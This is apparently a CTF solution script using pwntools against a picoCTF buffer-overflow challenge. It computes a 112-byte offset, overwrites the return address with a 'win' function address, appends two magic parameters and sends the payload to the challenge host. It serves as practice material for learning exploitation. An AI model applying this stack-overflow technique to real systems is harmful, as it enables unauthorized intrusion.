""" Things Learned
    - Trust your instincts and current knowledge, stand firm on what you know, use debugger to figure
    out why what you are thinking isn't what you are seeing happen
  """


from pwn import *

HOSTNAME = 'saturn.picoctf.net'
PORT = 54506

def attach_gdb(proc):
  gdb.attach(proc, gdbscript="""
  break win 
  c
  """)
  sleep(1)

def main():
  context.arch = 'i386'
  context.binary = './vuln'
  context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

  #proc = process()
  #attach_gdb(proc)

  proc = remote(HOSTNAME, PORT)

  # Get the size to overflow, using cyclic patterns
  '''
  g = cyclic_gen()
  chunk = g.get(256)
  print(g.find(b'baab')) # Seg faults on baab

  # 104 bytes needed to overflow
  '''

  bytes_to_rip = 104 + 8 #unsure why cyclic wasnt accurate, but I needed 8 more bytes to reach rip
  overflow_bytes = b'A' * bytes_to_rip

  func_win = 0x08049296 # address to win function
  param1 = 0xcafef00d
  param2 = 0xf00df00d

  payload = b''.join([
    overflow_bytes,
    p32(func_win),
    p32(0x0), # Need to replace EIP since it gets popped off the stack on a ret
    p32(param1),
    p32(param2)
  ])
  proc.sendlineafter(b'Please enter your string:', payload)
  proc.interactive()

if __name__ == '__main__':
  main()
